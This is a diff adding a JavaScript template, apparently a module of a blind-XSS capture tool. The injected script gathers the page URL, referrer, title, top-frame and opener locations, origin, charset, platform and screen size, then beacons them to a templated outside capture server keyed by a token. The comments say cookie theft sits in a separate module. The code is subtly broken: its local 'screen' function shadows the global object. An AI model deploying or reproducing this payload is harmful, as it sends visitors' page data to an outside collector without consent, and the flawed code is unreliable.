@@ -1,0 +1,53 @@
+// metadata.js.tmpl — 基本資訊模組（預設啟用）。
+//
+// 回收：location / referrer / title / toplocation / origin / charset /
+// platform / screen / opener。刻意不含 cookie 與 outerHTML：前者屬
+// fullcookie 模組（敏感、需 HITL），後者體積大且極易夾帶第三方 PII，
+// 這版直接不移植。
+(function () {
+  "use strict";
+  var TOKEN = {{ .Token | printf "%q" }};
+  var BASE = {{ .CaptureBase | printf "%q" }};
+  var MAX = {{ .MaxBytes }};
+
+  function s(v) {
+    try {
+      if (v === undefined || v === null) return "";
+      v = String(v);
+      return v.length > 512 ? v.slice(0, 512) : v;
+    } catch (e) { return ""; }
+  }
+
+  function screen() {
+    try { return screen.width + "x" + screen.height; } catch (e) { return ""; }
+  }
+
+  var fields = {
+    kind: "metadata",
+    url: s(location.toString()),
+    referrer: s(document.referrer),
+    title: s(document.title),
+    toplocation: s((function () { try { return top.location.href; } catch (e) { return ""; } })()),
+    origin: s(location.origin),
+    charset: s(document.characterSet || document.charset),
+    platform: s(navigator.platform),
+    screen: s(screen()),
+    opener: s((function () { try { return window.opener ? window.opener.location : ""; } catch (e) { return ""; } })())
+  };
+
+  // sendBeacon 優先（頁面即將卸載也送得出），fallback XHR POST。
+  var body = Object.keys(fields).map(function (k) {
+    return encodeURIComponent(k) + "=" + encodeURIComponent(fields[k]);
+  }).join("&");
+  if (body.length > MAX) { body = body.slice(0, MAX); }
+
+  var url = BASE + "/" + TOKEN;
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(url, new Blob([body], { type: "application/x-www-form-urlencoded" }));
+  } else {
+    var x = new XMLHttpRequest();
+    x.open("POST", url, true);
+    x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    x.send(body);
+  }
+})();
